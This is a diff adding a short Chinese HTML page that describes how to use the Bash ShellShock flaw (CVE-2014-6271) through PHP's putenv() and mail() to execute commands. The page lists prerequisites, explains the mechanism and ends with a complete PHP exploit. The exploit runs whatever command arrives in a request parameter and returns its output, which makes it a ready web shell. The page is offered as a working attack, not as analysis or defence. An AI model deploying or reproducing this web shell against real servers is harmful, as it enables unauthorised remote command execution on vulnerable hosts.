@@ -1,0 +1,23 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
+			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h2 class="cs868C439D">
+			<a name="利用-shellshock-绕过"><span class="cs83F14626">利用</span><span class="csB2D98684"> ShellShock </span><span class="cs83F14626">绕过</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs5BEC2C28">1. </span><span class="csE3F655E4">前提条件</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">目标</span><span class="cs8926E06">OS</span><span class="cs9C1B1871">存在</span><span class="cs8926E06">Bash</span><span class="cs9C1B1871">破壳（</span><span class="cs8926E06">CVE-2014-6271</span><span class="cs9C1B1871">）漏洞</span><span class="cs8926E06"> PHP 5.* linux putenv()</span><span class="cs9C1B1871">、</span><span class="cs8926E06">mail()</span><span class="cs9C1B1871">可用</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">2. </span><span class="csE3F655E4">基本原理</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">一般函数体内的代码不会被执行，但破壳漏洞会错误的将</span><span class="cs8926E06">&quot;{}&quot;</span><span class="cs9C1B1871">花括号外的命令进行执行</span><span class="cs8926E06"> php</span><span class="cs9C1B1871">里的某些函数</span><span class="cs8926E06">(</span><span class="cs9C1B1871">例如</span><span class="cs8926E06">:mail()</span><span class="cs9C1B1871">、</span><span class="cs8926E06">imap_mail())</span><span class="cs9C1B1871">能调用</span><span class="cs8926E06">popen</span><span class="cs9C1B1871">或其他能够派生</span><span class="cs8926E06">bash</span><span class="cs9C1B1871">子进程的函数，可以通过这些函数来触发破壳漏洞</span><span class="cs8926E06">(CVE-2014-6271)</span><span class="cs9C1B1871">执行命令。</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">3. exp</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;function shellshock($cmd) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;$tmp = tempnam(&quot;.&quot;,&quot;data&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;putenv(&quot;PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;$output = @file_get_contents($tmp);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;@unlink($tmp);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if($output != &quot;&quot;) return $output;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else return &quot;No output, or not vuln.&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo shellshock($_REQUEST[&quot;cmd&quot;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p></body>
+</html>
